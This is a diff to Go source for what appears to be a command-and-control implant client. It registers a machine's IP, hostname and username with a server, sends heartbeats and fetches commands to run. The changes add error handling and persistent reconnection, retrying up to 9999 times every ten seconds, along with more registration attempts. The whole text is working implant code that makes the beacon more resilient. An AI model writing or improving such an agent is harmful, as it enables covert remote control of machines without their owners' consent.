@@ -8,6 +8,8 @@ package main
 
 import (
 	"encoding/json"
+	"errors"
+	"fmt"
 	"io"
 	"io/ioutil"
 	"net"
@@ -20,6 +22,8 @@ import (
 	"strings"
 	"time"
 )
+
+var registerkey string
 
 // Global Variable Declaration
 var SERVERIP string = "localhost"
@@ -38,12 +42,12 @@ func GetOutboundIP() string {
 
 // Return error type for error checking?
 // Think about os.Exit(1) in the error checking down below
-func simplePost(endpoint string, data url.Values) map[string]interface{} {
+func simplePost(endpoint string, data url.Values) (map[string]interface{}, error) {
 	response, err := http.PostForm(endpoint, data)
 
 	if err != nil {
 		//fmt.Println("[-] Error: ", err)
-		os.Exit(1)
+		return nil, errors.New("[-] Cannot connect to server")
 	}
 
 	defer response.Body.Close()
@@ -51,7 +55,7 @@ func simplePost(endpoint string, data url.Values) map[string]interface{} {
 
 	if err != nil {
 		//fmt.Println("[-] Error:", err)
-		os.Exit(1)
+		return nil, errors.New("[-] Cannot connect to server")
 	}
 
 	responseBody := string(body)
@@ -61,14 +65,18 @@ func simplePost(endpoint string, data url.Values) map[string]interface{} {
 
 	//fmt.Println(jsonData["result"])
 
-	return jsonData
+	return jsonData, nil
 }
 
 func firstContact() string {
 	endpoint := URL + "/firstcontact"
 
 	var data = url.Values{"firstcontactkey": {FIRSTCONTACTKEY}}
-	jsonData := simplePost(endpoint, data)
+	jsonData, err := simplePost(endpoint, data)
+
+	if err != nil {
+		return err.Error()
+	}
 
 	if jsonData["result"] == "success" {
 		return jsonData["registerkey"].(string)
@@ -86,7 +94,11 @@ func register(registerkey string, ip string, os_name string, user string) bool {
 		"os":          {os_name},
 		"user":        {user}}
 
-	jsonData := simplePost(endpoint, data)
+	jsonData, err := simplePost(endpoint, data)
+
+	if err != nil {
+		return false
+	}
 
 	if jsonData["result"] == "success" {
 		return true
@@ -104,7 +116,11 @@ func heartbeat(registerkey string, ip string, user string) bool {
 		"ip":          {ip},
 		"user":        {user}}
 
-	jsonData := simplePost(endpoint, data)
+	jsonData, err := simplePost(endpoint, data)
+
+	if err != nil {
+		return false
+	}
 
 	if jsonData["result"] == "success" {
 		return true
@@ -119,7 +135,11 @@ func fetchCommand(registerkey string, ip string) string {
 
 	var data = url.Values{"registerkey": {registerkey}}
 
-	jsonData := simplePost(endpoint, data)
+	jsonData, err := simplePost(endpoint, data)
+
+	if err != nil {
+		return err.Error()
+	}
 
 	if jsonData["result"] == "success" {
 		return jsonData["command"].(string)
@@ -224,15 +244,25 @@ func main() {
 	os_name, _ := os.Hostname()
 	username := user.Username
 
-	registerkey := firstContact()
-	//fmt.Println("Reigster key = ", registerkey)
+	registerkey = firstContact()
+	if strings.Contains(registerkey, "[-]") {
+		for i := 1; i < 9999; i++ {
+			fmt.Println("[-] Cannot connect to server. Retrying...")
+			registerkey = firstContact()
+			if !strings.Contains(registerkey, "[-]") {
+				break
+			}
+			time.Sleep(10 * time.Second)
+		}
+	}
 
+	//fmt.Println("[+] Registerkey = ", registerkey)
 	register_result := register(registerkey, ip, os_name, username)
 
-	// Register was not successful. Exit.
+	// Register was not successful. Retry registering for 5 times again
 	if register_result == false {
-		for i := 1; i < 5; i++ {
-			registerkey := firstContact()
+		for i := 1; i < 10; i++ {
+			registerkey = firstContact()
 			register_result := register(registerkey, ip, os_name, username)
 			if register_result == true {
 				break
